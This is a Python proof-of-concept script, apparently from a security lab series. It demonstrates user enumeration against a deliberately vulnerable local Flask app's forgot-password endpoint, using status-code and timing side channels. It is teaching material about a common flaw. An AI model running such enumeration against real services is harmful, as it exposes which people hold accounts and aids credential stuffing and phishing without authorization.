"""
Attack #3 — USER ENUMERATION IN RECOVERY  (CWE-204 / OWASP ASVS 2.5.x)
Target: POST /forgot-password on the vulnerable Flask app (127.0.0.1:5000)

Premise
-------
/forgot-password branches on whether the email is known:

    if not user:
        return jsonify(error="no account with that email"), 404
    ... otherwise write a token, build a link, return 200 "recovery email sent"

So a KNOWN email returns 200 and an UNKNOWN email returns 404 with a
different body. That is a direct enumeration oracle -- and because only the
known path performs DB writes + link building, there is ALSO a measurable
timing difference. Either signal confirms account existence.

This is the recovery-side counterpart to attack #1. Forgot-password oracles
are especially dangerous because they need no signup attempt and look like
normal user behaviour.

What this script proves
-----------------------
For a list of candidate emails it reports EXISTS / absent from the status
code + body, and separately shows the mean response time for known vs
unknown addresses -- demonstrating the covert timing channel that survives
even if the messages were made identical but the code paths were not.

Runs unmodified against a fresh instance (seeded: victim@ / root@corp.example).
"""

import time
import requests

BASE = "http://127.0.0.1:5000"

CANDIDATES = [
    "victim@corp.example",     # seeded -> exists
    "root@corp.example",       # seeded -> exists
    "ceo@corp.example",        # absent
    "nobody@nowhere.test",     # absent
    "sales@corp.example",      # absent
]


def forgot(email):
    t0 = time.perf_counter()
    r = requests.post(f"{BASE}/forgot-password", json={"email": email})
    dt = time.perf_counter() - t0
    return r, dt


def classify(r):
    if r.status_code == 200 and "sent" in r.text:
        return "EXISTS"
    if r.status_code == 404:
        return "absent"
    return f"other ({r.status_code})"


def mean_time(email, n=5):
    """Average several requests to expose the timing side channel."""
    samples = []
    for _ in range(n):
        _, dt = forgot(email)
        samples.append(dt)
    return sum(samples) / len(samples)


def main():
    print("=" * 68)
    print("ATTACK #3 - Recovery-flow user enumeration (status + timing)")
    print("Target:", BASE)
    print("=" * 68)

    print("\n[*] Signal 1 - response status/body oracle:")
    found = []
    for email in CANDIDATES:
        r, _ = forgot(email)
        verdict = classify(r)
        print(f"    {email:<24} -> HTTP {r.status_code:<3} {verdict:<8} {r.text.strip()}")
        if verdict == "EXISTS":
            found.append(email)

    print("\n[*] Signal 2 - covert timing channel (mean of 5 requests each):")
    known_email = "victim@corp.example"
    unknown_email = "nobody@nowhere.test"
    t_known = mean_time(known_email)
    t_unknown = mean_time(unknown_email)
    print(f"    known   ({known_email:<22}) ~ {t_known*1000:7.2f} ms")
    print(f"    unknown ({unknown_email:<22}) ~ {t_unknown*1000:7.2f} ms")
    ratio = t_known / t_unknown if t_unknown else float("inf")
    print(f"    known/unknown time ratio = {ratio:.2f}x "
          f"({'known path is slower -> observable' if ratio > 1.1 else 'timing close on this run'})")

    print("\n" + "-" * 68)
    print("[+] ATTACKER GAIN - confirmed which emails have accounts, unauthenticated:")
    print(f"    {found}")
    print("[+] No signup needed; requests look like ordinary 'forgot password' traffic.")
    print("-" * 68)


if __name__ == "__main__":
    main()
